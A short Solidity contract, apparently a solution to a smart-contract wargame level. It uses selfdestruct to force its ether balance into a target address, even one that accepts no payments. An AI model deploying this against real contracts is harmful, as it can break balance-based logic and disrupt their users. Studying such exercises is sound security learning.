// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    receive() external payable {}

    function destructMe(address payable _target) external {
        selfdestruct(_target);
    }
}
